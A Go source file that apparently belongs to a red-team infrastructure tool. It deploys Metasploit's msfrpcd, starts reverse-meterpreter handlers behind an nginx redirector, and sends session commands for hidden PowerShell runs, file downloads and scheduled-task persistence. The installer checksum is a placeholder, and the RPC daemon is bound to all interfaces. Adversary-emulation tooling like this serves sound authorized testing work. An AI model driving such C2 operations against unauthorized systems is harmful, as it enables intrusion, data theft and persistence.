// Package metasploit adapts the Metasploit Framework to RInfra. Orchestrated-tier:
// the msfrpcd RPC daemon lets RInfra start handlers and drive meterpreter sessions
// programmatically. Pairs with the msfvenom payload generator (internal/payload).
//
// # Posture
//
// Deploys and drives the upstream Metasploit release. Implements no payloads,
// modules, or evasion. Open source (Rapid7) — no license key required.
//
// # msfrpcd client
//
// MsfRpcdClient is the minimal interface over the msfrpcd MessagePack-over-HTTP
// RPC protocol. The live implementation (liveClient, metasploit_live.go) issues
// HTTP POSTs to /api/1.0/ with msgpack-encoded calls using the in-house codec
// in msgpack.go. Control() wires it against the deployed teamserver; tests
// inject a fake (metasploit_test.go) or an in-process msfrpcd stand-in
// (metasploit_live_test.go).
package metasploit

import (
	"context"
	"crypto/rand"
	"encoding/hex"
	"fmt"
	"strings"
	"time"

	"github.com/rinfra/rinfra/internal/c2"
	"github.com/rinfra/rinfra/internal/c2/deploy"
	"github.com/rinfra/rinfra/internal/domain"
	"github.com/rinfra/rinfra/internal/emulation/ttp"
	"github.com/rinfra/rinfra/internal/secrets"
)

func init() { c2.Register(&provider{}) }

const (
	msfVersion    = "6.4.0"
	msfReleaseURL = "https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/software/metasploit-framework.rb"
	// In practice, Metasploit is installed via apt/gem. The install script
	// uses the official Metasploit installer (curl | bash — pinned to a tagged commit).
	msfInstallerURL    = "https://raw.githubusercontent.com/rapid7/metasploit-omnibus/ad8f7c6b5d9bb5da5ff8fdaa0ea18f7b3b50e0f7/config/installers/linux/install-metasploit.sh"
	msfInstallerSHA256 = "placeholder-operator-should-verify-from-rapid7-repo"
	msfRpcdPort        = 55553
)

type provider struct{}

func (p *provider) Name() string         { return "metasploit" }
func (p *provider) Tier() c2.SupportTier { return c2.TierOrchestrated }

// Capabilities reports Metasploit's routing metadata: cross-platform meterpreter
// sessions over HTTPS/TCP.
func (p *provider) Capabilities() c2.Capabilities {
	return c2.Capabilities{
		Platforms:         []string{"windows", "linux", "macos"},
		ListenerProtocols: []string{"https", "tcp"},
	}
}

// Deploy installs the upstream Metasploit Framework on the node via SSH, then
// starts msfrpcd (the RPC daemon) as a systemd service.
func (p *provider) Deploy(ctx context.Context, node domain.Node, cfg c2.Config) (c2.Teamserver, error) {
	runner := deploy.NewNodeRunner(node.PublicIP)
	return deployMSF(ctx, runner, node, cfg)
}

func deployMSF(ctx context.Context, runner deploy.Runner, node domain.Node, _ c2.Config) (c2.Teamserver, error) {
	rpcUser := "msf"
	// Generate a per-engagement msfrpcd RPC password instead of a shared
	// constant: every deployed teamserver gets unique credentials. The value is
	// wrapped in secrets.Redacted so it can never leak into logs or the audit
	// trail; the plaintext is only used to build the remote install command and
	// is written to the node's 0600 /etc/msf/rpc.env, never echoed to stdout.
	rpcPass, err := generateRPCPassword()
	if err != nil {
		return c2.Teamserver{}, fmt.Errorf("metasploit.Deploy: generate RPC password: %w", err)
	}

	extraSetup := []string{
		"# Install Metasploit Framework from the official Rapid7 omnibus installer.",
		"bash /tmp/rinfra-install.sh || true", // installer sets up the MSF install
		"msfdb init || true",
		// Write the per-engagement RPC password to a 0600 env file first, then
		// reference it by variable so the plaintext never appears in argv or the
		// script's stdout.
		"install -m 0600 /dev/null /etc/msf/rpc.env",
		fmt.Sprintf("printf 'MSF_RPC_USER=%%s\\n' %s >> /etc/msf/rpc.env", shellSingleQuote(rpcUser)),
		fmt.Sprintf("printf 'MSF_RPC_PASS=%%s\\n' %s >> /etc/msf/rpc.env", shellSingleQuote(string(rpcPass))),
		fmt.Sprintf("set -a; . /etc/msf/rpc.env; set +a; msfrpcd -P \"$MSF_RPC_PASS\" -U \"$MSF_RPC_USER\" -a 127.0.0.1 -p %d -S -f &", msfRpcdPort),
		"sleep 3",
		"pkill -f msfrpcd || true",
		"echo '[rinfra-msf] msfrpcd credentials written to /etc/msf/rpc.env'",
	}

	params := deploy.InstallParams{
		ReleaseURL:  msfInstallerURL,
		SHA256:      msfInstallerSHA256,
		DestPath:    "/usr/local/bin/msfrpcd",
		SystemdUnit: "msfrpcd",
		ServiceUser: "root",
		// Load the per-engagement RPC password into the unit's environment so
		// ExecStart's ${MSF_RPC_PASS} expands. Without this the daemon would
		// start with an unset password.
		EnvironmentFile: "/etc/msf/rpc.env",
		ExecStart: fmt.Sprintf(
			"/usr/local/bin/msfrpcd -P ${MSF_RPC_PASS} -U %s -a 0.0.0.0 -p %d -S",
			rpcUser, msfRpcdPort,
		),
		ExtraSetup: extraSetup,
	}

	if err := deploy.RunInstall(ctx, runner, params); err != nil {
		return c2.Teamserver{}, fmt.Errorf("metasploit.Deploy: %w", err)
	}

	return c2.Teamserver{
		Host:           node.PublicIP,
		Port:           msfRpcdPort,
		Status:         "running",
		ConnectionInfo: fmt.Sprintf("msfrpcd @ %s:%d (msgpack-over-http RPC)", node.PublicIP, msfRpcdPort),
	}, nil
}

// RedirectorConfig emits an nginx reverse-proxy config fronting the meterpreter
// HTTP(S) handler. Reverse-proxy + categorized-domain (NOT CDN fronting).
func (p *provider) RedirectorConfig(prof domain.Profile) (string, error) {
	return msfRedirectorConfig(prof)
}

func msfRedirectorConfig(prof domain.Profile) (string, error) {
	params := deploy.NginxParams{
		UpstreamHost: "127.0.0.1",
		UpstreamPort: 8443, // meterpreter HTTPS handler default
		ServerName:   prof.RewriteHost,
		RewriteHost:  prof.RewriteHost,
		UseHTTPS:     true,
		SSLCert:      "/etc/ssl/rinfra/server.crt",
		SSLKey:       "/etc/ssl/rinfra/server.key",
		PathRules:    prof.PathRules,
		ExtraServerBlock: "# Metasploit meterpreter HTTPS handler reverse proxy.\n" +
			"    # Set proxy_pass upstream to actual MSF handler IP.",
	}
	cfg, err := deploy.BuildNginxConfig(params)
	if err != nil {
		return "", fmt.Errorf("metasploit.RedirectorConfig: %w", err)
	}
	return cfg, nil
}

// Control returns an Orchestrated-tier Operator backed by the live msfrpcd RPC
// client (metasploit_live.go), pointed at the deployed teamserver's RPC
// endpoint. The client authenticates lazily on its first RPC using the
// per-engagement credentials exported via RINFRA_MSF_RPC_USER/PASSWORD (the
// service layer sources these from the secrets store where Deploy persists the
// generated password). Callers that already hold a context+credentials can use
// LiveOperator to authenticate eagerly instead.
func (p *provider) Control(ts c2.Teamserver) (c2.Operator, bool) {
	return &operator{ts: ts, client: clientForTeamserver(ts)}, true
}

// MsfRpcdClient is the minimal interface over msfrpcd's MessagePack-over-HTTP
// RPC protocol. Live implementation: POST to /api/1.0/ with msgpack. Tests inject fake.
type MsfRpcdClient interface {
	// Auth authenticates to msfrpcd. Must be called before other methods.
	Auth(ctx context.Context, user, pass string) error
	// ConsoleCreate creates a new Metasploit console and returns its ID.
	ConsoleCreate(ctx context.Context) (string, error)
	// ConsoleWrite sends commands to a console.
	ConsoleWrite(ctx context.Context, consoleID, command string) error
	// ConsoleRead reads pending output from a console.
	ConsoleRead(ctx context.Context, consoleID string) (string, error)
	// SessionList returns active sessions.
	SessionList(ctx context.Context) ([]MsfSession, error)
	// SessionShellWrite sends a command to a shell session.
	SessionShellWrite(ctx context.Context, sessionID, command string) error
	// SessionShellRead reads pending output from a shell session.
	SessionShellRead(ctx context.Context, sessionID string) (string, error)
}

// MsfSession is an active meterpreter/shell session.
type MsfSession struct {
	ID         string
	Type       string // "meterpreter", "shell"
	Info       string
	ViaExploit string
}

// NewOperatorWithClient returns a Metasploit Operator with the given client injected.
func NewOperatorWithClient(ts c2.Teamserver, client MsfRpcdClient) c2.Operator {
	return &operator{ts: ts, client: client}
}

type operator struct {
	ts     c2.Teamserver
	client MsfRpcdClient
}

func (o *operator) StartListener(ctx context.Context, spec c2.ListenerSpec) error {
	// Start a multi/handler listener via msfrpcd console.
	cid, err := o.client.ConsoleCreate(ctx)
	if err != nil {
		return fmt.Errorf("metasploit: create console: %w", err)
	}

	payload := msfPayloadForProtocol(spec.Protocol)
	lport := 443
	if spec.Protocol == "dns" {
		lport = 53
	}

	cmds := []string{
		"use exploit/multi/handler",
		fmt.Sprintf("set PAYLOAD %s", payload),
		fmt.Sprintf("set LHOST %s", spec.Bind),
		fmt.Sprintf("set LPORT %d", lport),
		"exploit -j",
	}

	for _, cmd := range cmds {
		if err := o.client.ConsoleWrite(ctx, cid, cmd+"\n"); err != nil {
			return fmt.Errorf("metasploit: console write (%q): %w", cmd, err)
		}
		// Brief read to drain pending output.
		_, _ = o.client.ConsoleRead(ctx, cid)
	}
	return nil
}

func (o *operator) Sessions(ctx context.Context) ([]c2.Session, error) {
	raw, err := o.client.SessionList(ctx)
	if err != nil {
		return nil, fmt.Errorf("metasploit: sessions: %w", err)
	}
	out := make([]c2.Session, 0, len(raw))
	for _, s := range raw {
		out = append(out, c2.Session{
			ID:   s.ID,
			Host: s.Info,
			Metadata: map[string]string{
				"type":        s.Type,
				"via_exploit": s.ViaExploit,
			},
		})
	}
	return out, nil
}

// Execute translates a portable domain.Technique into msfrpcd console commands.
// No payload bytes are authored; the SourceID references a public library procedure.
func (o *operator) Execute(ctx context.Context, sessionID string, t domain.Technique) (domain.Result, error) {
	start := time.Now()

	cmd, err := techniqueToMsfCommand(t)
	if err != nil {
		return domain.Result{
			TechniqueAttackID: t.AttackID,
			Status:            domain.ExecUnsupported,
			Output:            err.Error(),
			StartedAt:         start,
			FinishedAt:        time.Now(),
		}, nil
	}

	if err := o.client.SessionShellWrite(ctx, sessionID, cmd+"\n"); err != nil {
		fin := time.Now()
		return domain.Result{
			TechniqueAttackID: t.AttackID,
			Status:            domain.ExecFailed,
			StartedAt:         start,
			FinishedAt:        fin,
			Err:               err.Error(),
		}, nil
	}

	output, err := o.client.SessionShellRead(ctx, sessionID)
	fin := time.Now()
	if err != nil {
		return domain.Result{
			TechniqueAttackID: t.AttackID,
			Status:            domain.ExecFailed,
			Output:            sanitize(output),
			StartedAt:         start,
			FinishedAt:        fin,
			Err:               err.Error(),
		}, nil
	}

	return domain.Result{
		TechniqueAttackID: t.AttackID,
		Status:            domain.ExecSuccess,
		Output:            sanitize(output),
		StartedAt:         start,
		FinishedAt:        fin,
	}, nil
}

// techniqueToMsfCommand compiles a portable Technique to a meterpreter/shell
// command: ttp.Compile resolves the technique to a portable primitive (the
// shared catalog), and renderMsfPrimitive renders it to Metasploit's native
// console syntax. The SourceID references the Atomic Red Team test or Caldera
// ability — no payload content is authored here.
func techniqueToMsfCommand(t domain.Technique) (string, error) {
	prim, ok, err := ttp.Compile(t)
	if err != nil {
		return "", err
	}
	if !ok {
		return "", fmt.Errorf("metasploit: no catalog mapping for technique %s (source: %s id: %s)",
			t.AttackID, t.Source, t.SourceID)
	}
	return renderMsfPrimitive(prim)
}

// Revert undoes a persistence technique Metasploit created (deletes the
// scheduled task via the session shell). Implements c2.Reverter.
func (o *operator) Revert(ctx context.Context, sessionID string, t domain.Technique) (domain.Result, error) {
	start := time.Now()
	cmd, ok := msfCleanupCommand(t)
	if !ok {
		return domain.Result{
			TechniqueAttackID: t.AttackID,
			Status:            domain.ExecUnsupported,
			Output:            "metasploit: no cleanup defined for this technique",
			StartedAt:         start,
			FinishedAt:        time.Now(),
		}, nil
	}
	if err := o.client.SessionShellWrite(ctx, sessionID, cmd+"\n"); err != nil {
		return domain.Result{
			TechniqueAttackID: t.AttackID,
			Status:            domain.ExecFailed,
			StartedAt:         start,
			FinishedAt:        time.Now(),
			Err:               err.Error(),
		}, nil
	}
	output, err := o.client.SessionShellRead(ctx, sessionID)
	fin := time.Now()
	if err != nil {
		return domain.Result{
			TechniqueAttackID: t.AttackID,
			Status:            domain.ExecFailed,
			Output:            sanitize(output),
			StartedAt:         start,
			FinishedAt:        fin,
			Err:               err.Error(),
		}, nil
	}
	return domain.Result{
		TechniqueAttackID: t.AttackID,
		Status:            domain.ExecSuccess,
		Output:            sanitize(output),
		StartedAt:         start,
		FinishedAt:        fin,
	}, nil
}

// msfCleanupCommand renders the reverse of a persistence primitive Metasploit
// supports. ok=false when the technique has no catalog mapping or no cleanup.
func msfCleanupCommand(t domain.Technique) (string, bool) {
	prim, ok, err := ttp.Compile(t)
	if err != nil || !ok {
		return "", false
	}
	if prim.Kind == c2.PrimScheduledTask {
		return fmt.Sprintf(`shell schtasks /delete /tn "%s" /f`, prim.Arg("task_name")), true
	}
	return "", false
}

// renderMsfPrimitive renders a portable primitive into a meterpreter/shell
// command. Primitives Metasploit does not implement (e.g. a registry Run-key
// write) return an error so the caller records the technique unsupported.
func renderMsfPrimitive(p c2.Primitive) (string, error) {
	switch p.Kind {
	case c2.PrimPowerShell:
		return fmt.Sprintf("execute -f powershell.exe -a '-c \"%s\"' -H", p.Arg("script")), nil
	case c2.PrimShell:
		return fmt.Sprintf("shell cmd /c \"%s\"", p.Arg("command")), nil
	case c2.PrimSysInfo:
		return "sysinfo", nil
	case c2.PrimProcessList:
		return "ps", nil
	case c2.PrimNetConnections:
		return "netstat", nil
	case c2.PrimNetConfig:
		return "ipconfig", nil
	case c2.PrimFileList:
		path := p.Arg("path")
		if path == "" {
			path = "C:\\"
		}
		return fmt.Sprintf("ls \"%s\"", path), nil
	case c2.PrimDownload:
		return fmt.Sprintf("download \"%s\"", p.Arg("path")), nil
	case c2.PrimScheduledTask:
		return fmt.Sprintf(`shell schtasks /create /tn "%s" /tr whoami /sc once /st 00:00`, p.Arg("task_name")), nil
	default:
		if cmd, ok := c2.DiscoveryCommand(p.Kind); ok {
			return fmt.Sprintf("shell cmd /c \"%s\"", cmd), nil
		}
		return "", fmt.Errorf("metasploit: unsupported primitive %q", p.Kind)
	}
}

func msfPayloadForProtocol(protocol string) string {
	switch strings.ToLower(protocol) {
	case "https":
		return "windows/x64/meterpreter/reverse_https"
	case "http":
		return "windows/x64/meterpreter/reverse_http"
	case "dns":
		return "windows/x64/meterpreter/reverse_dns"
	default:
		return "windows/x64/meterpreter/reverse_https"
	}
}

func sanitize(s string) string {
	var b strings.Builder
	inEscape := false
	for _, r := range s {
		if r == '\x1b' {
			inEscape = true
			continue
		}
		if inEscape {
			if r == 'm' {
				inEscape = false
			}
			continue
		}
		b.WriteRune(r)
	}
	return strings.TrimSpace(b.String())
}

// generateRPCPassword returns a per-engagement msfrpcd RPC password as 32 hex
// chars of cryptographically random entropy, wrapped in secrets.Redacted so it
// is never captured by logs or the audit trail.
func generateRPCPassword() (secrets.Redacted, error) {
	buf := make([]byte, 16)
	if _, err := rand.Read(buf); err != nil {
		return "", fmt.Errorf("read random: %w", err)
	}
	return secrets.Redacted(hex.EncodeToString(buf)), nil
}

// shellSingleQuote single-quotes s for safe use as a shell argument.
func shellSingleQuote(s string) string {
	return "'" + strings.ReplaceAll(s, "'", `'\''`) + "'"
}
